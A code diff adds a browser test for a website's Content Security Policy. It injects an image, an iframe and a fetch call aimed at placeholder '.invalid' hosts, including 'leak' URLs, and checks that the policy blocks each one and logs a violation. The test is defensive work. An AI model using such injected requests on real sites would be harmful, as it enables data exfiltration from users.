@@ -73,3 +73,29 @@ test('注入的 inline script、事件屬性與外站腳本都會被擋（反向
   // CSP 在發出請求前就擋下（.invalid 也不會真的去解析）；blockedURI 可能只留 origin。
   expect(seen.some((line) => line.includes('https://example.invalid'))).toBe(true)
 })
+
+test('注入的外站圖片、fetch、iframe 都會被擋，資料帶不出去（2026-11-12 img-src／connect-src／frame-src）', async ({ page }) => {
+  const violations = await watchViolations(page)
+  const response = await page.goto('/visit', { waitUntil: 'networkidle' })
+  const csp = response?.headers()['content-security-policy'] ?? ''
+  expect(csp).toContain("img-src 'self' data: blob: https://i.ytimg.com")
+  expect(csp).toContain("connect-src 'self' https://challenges.cloudflare.com")
+  expect(csp).toContain("frame-src 'self' https://www.youtube-nocookie.com https://challenges.cloudflare.com")
+  const fetched = await page.evaluate(async () => {
+    const img = document.createElement('img')
+    img.src = 'https://img.example.invalid/leak.png?d=1'
+    document.body.appendChild(img)
+    const frame = document.createElement('iframe')
+    frame.src = 'https://frame.example.invalid/'
+    document.body.appendChild(frame)
+    let fetchedOk = true
+    try { await fetch('https://connect.example.invalid/leak') } catch { fetchedOk = false }
+    await new Promise((resolve) => setTimeout(resolve, 500))
+    return fetchedOk
+  })
+  expect(fetched).toBe(false)
+  const seen = await violations()
+  expect(seen.some((line) => line.startsWith('img-src') && line.includes('img.example.invalid'))).toBe(true)
+  expect(seen.some((line) => line.startsWith('frame-src') && line.includes('frame.example.invalid'))).toBe(true)
+  expect(seen.some((line) => line.startsWith('connect-src') && line.includes('connect.example.invalid'))).toBe(true)
+})
